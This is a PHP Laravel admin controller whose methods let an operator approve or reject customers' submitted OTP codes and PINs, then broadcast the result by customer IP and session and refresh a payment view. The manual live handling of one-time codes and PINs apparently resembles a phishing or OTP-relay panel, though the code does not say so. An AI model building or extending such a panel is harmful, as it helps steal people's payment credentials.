<?php

namespace App\Http\Controllers\Admin;

use App\Events\OtpApproved;
use App\Events\OtpRejected;
use App\Events\PinApproved;
use App\Events\PinRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Models\OtpCode;
use App\Services\OtpStateService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class AdminOtpController extends Controller
{
    use NotifiesDashboard;

    public function __construct(
        private readonly OtpStateService $otpState,
    ) {}

    /**
     * Approve an OTP
     */
    public function approve(int $id, Request $request): JsonResponse
    {
        // Atomic check-then-update to prevent race conditions
        [$otp, $earlyResponse] = DB::transaction(function () use ($id) {
            $otp = OtpCode::lockForUpdate()->findOrFail($id);
            $result = $this->otpState->approve($otp);

            if (! $result['success']) {
                $msg = match ($result['error']) {
                    'otp_expired' => 'انتهت صلاحية رمز التحقق',
                    default   => 'هذا الرمز تم معالجته مسبقاً',
                };
                $payload = ['success' => false, 'message' => $msg];
                if ($result['error'] === 'otp_expired') {
                    $payload['expired'] = true;
                }
                return [$otp, response()->json($payload, 422)];
            }

            return [$otp, null];
        });

        if ($earlyResponse) {
            return $earlyResponse;
        }

        $customerIp = $otp->customer?->ip_address ?? '';
        $sessionId  = $otp->session_id;

        if (empty($customerIp)) {
            Log::error("approveOtp: No customer IP for OTP #{$id}");
        }

        $customerId = $otp->customer?->id;

        // Flush cache BEFORE broadcast so other admins get fresh data immediately
        $this->flushCustomerCache();

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpApproved($customerIp, null, $sessionId, $customerId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinApproved($customerIp, null, $sessionId, $customerId))->toOthers();
            }
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
        }

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على رمز OTP بنجاح',
        ]);
    }

    /**
     * Reject an OTP
     */
    public function reject(int $id, Request $request): JsonResponse
    {
        $request->validate([
            'reason' => 'nullable|string|max:500',
        ]);

        $reason = $request->input('reason');

        // Atomic check-then-update — same pattern as approve() to prevent race on otp_fail_count
        [$otp, $earlyResponse] = DB::transaction(function () use ($id, $reason) {
            $otp = OtpCode::lockForUpdate()->findOrFail($id);
            $result = $this->otpState->reject($otp, $reason);

            if (! $result['success']) {
                return [$otp, response()->json([
                    'success' => false,
                    'message' => 'هذا الرمز تم معالجته مسبقاً',
                ], 422)];
            }

            return [$otp, null];
        });

        if ($earlyResponse) {
            return $earlyResponse;
        }

        $customerIp = $otp->customer?->ip_address ?? '';
        $customerId = $otp->customer?->id;
        $sessionId  = $otp->session_id;

        // Flush cache BEFORE broadcast so other admins get fresh data immediately
        $this->flushCustomerCache();

        try {
            if ($otp->type === 'otp') {
                broadcast(new OtpRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
            } elseif ($otp->type === 'pin') {
                broadcast(new PinRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
            }
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
        }

        $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
        $this->refreshPaymentViewed($customerIp);

        return response()->json([
            'success' => true,
            'message' => 'تم رفض رمز OTP',
        ]);
    }
}
